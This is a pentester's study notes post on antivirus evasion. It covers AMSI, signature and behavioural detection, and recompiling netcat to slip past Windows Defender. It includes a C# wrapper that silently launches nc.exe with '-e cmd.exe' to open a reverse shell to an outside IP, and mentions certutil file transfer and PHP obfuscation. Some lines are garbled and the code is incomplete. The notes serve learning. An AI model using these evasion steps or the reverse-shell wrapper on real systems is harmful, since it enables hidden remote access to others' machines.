---
title: AV Evasion Notes
date: 2022-07-01 00:00:00 +530
categories: [ Cyber Security Notes, AV Evasion]
tags: [Notes, Pentesting, AV Evasion, Red Team]     # TAG names should always be lowercase
---

_____________________
When it comes to AV evasion we have two primary types available:

-   On-Disk evasion
-   In-Memory evasion

On-Disk evasion is when we try to get a file (be it a tool, script, or otherwise) saved on the target, then executed. This is very common when working with executable (`.exe`) files.

In-Memory evasion is when we try to import a script directly into memory and execute it there. For example, this could mean downloading a PowerShell module from the internet or our own device and directly importing it without ever saving it to the disk.  

In ages past, In-Memory evasion was enough to bypass most AV solutions as the majority of antivirus software was unable to scan scripts stored in the memory of a running process. This is no longer the case though, as Microsoft implemented a feature called the **A**nti-**M**alware **S**can **I**nterface (AMSI). AMSI is essentially a feature of Windows that scans scripts as they enter memory. It doesn't actually check the scripts itself, but it does provide hooks for AV publishers to use -- essentially allowing existing antivirus software to obtain a copy of the script being executed, scan it, and decide whether or not it's safe to execute. Whilst there are various bypasses for this (often involving tricking AMSI into failing to load), these are out of scope for this room.

f we already have a shell on the target, we may also be able to use programs such as [SharpEDRChecker](https://github.com/PwnDexter/SharpEDRChecker) and [Seatbelt](https://github.com/GhostPack/Seatbelt) to identify the antivirus solution installed.

## AV Detection Methods

Generally speaking, detection methods can be classified into one of two categories:

-   Static Detection
-   Dynamic / Heuristic / Behavioural Detectio

Static detection methods usually involve some kind of signature detection. A very rudimentary system, for example, would be taking the hashsum of the suspicious file and comparing it against a database of known malware hashsums. This system does tend to be used; however, it would never be used by itself in modern antivirus solutions. For this reason it's usually a good idea to change _something_ when working with a known exploit.

Byte matching is another form of signature detection which works by searching through the program looking to match sequences of bytes against a known database of bad byte sequences. 

AV program hashes small sections of the file to check against the database, rather than hashing the entire thing. This obviously reduces the effectiveness of the technique, but does increase the speed somewhat.

1.  AV software can go through the executable line-by-line checking the flow of execution. Based on _pre-defined rules_ about what type of action is malicious (e.g. is the program reaching out to a known bad website, or messing with values in the registry that it shouldn't be?), the AV can see how the program _intends_ to act, and make decisions accordingly
2.  The suspicious software can outright be executed inside a sandbox environment under close supervision from the AV software. If the program acts maliciously then it is quarantined and flagged as malware

### PHP obfuscatror

[gaijin.at](https://www.gaijin.at/en/tools/php-obfuscator)

##  Compiling Netcat & Reverse Shell!

-   We could generate an executable reverse shell using msfvenom, then upload and activate it using the webshell. Again, msfvenom shells tend to be very distinctive. We could use the [Veil Framework](https://www.veil-framework.com/) to give us a meterpreter shell executable that might bypass Defender, but let's try to keep this manual for the time. Equally, [shellter](https://www.shellterproject.com/) (though old) might give us what we need. There are easier options though.

the version of netcat for Windows that comes with Kali is known to Defender, so we're going to need a different version. Fortunately there are many floating around! Let's use one from github, [here](https://github.com/int0x33/nc.exe/).

Clone the repository:  
`git clone https://github.com/int0x33/nc.exe/`

change cc in makefile to `CC=x86_64-w64-mingw32-gcc`
to compile `make 2>/deTryHackMe, CTFv/null`

Certutil is a default Windows tool that is used to (amongst other things) download CA certificates. This also makes it ideal for file transfers, _but_ Defender flags this as malicious.

_______________
`mono` dotnet core compiler for Linux.

C# Code:
```csharp
using System;
using System.Diagnostics;

namespace Wrapper{
	class Program{
		static void Main(){
			Process proc = new Process();
			ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-utkar5hm.exe", "10.50.85.17 27012 -e cmd.exe");
			procInfo.CreateNoWindow = true;
			proc.StartInfo = procInfo;
	proc.Start();
		}
	}
```
To compile: `mcs wrapper.cs`

Hmm some C# codes :
[mattymcfatty/unquotedPoC](https://github.com/mattymcfatty/unquotedPoC)
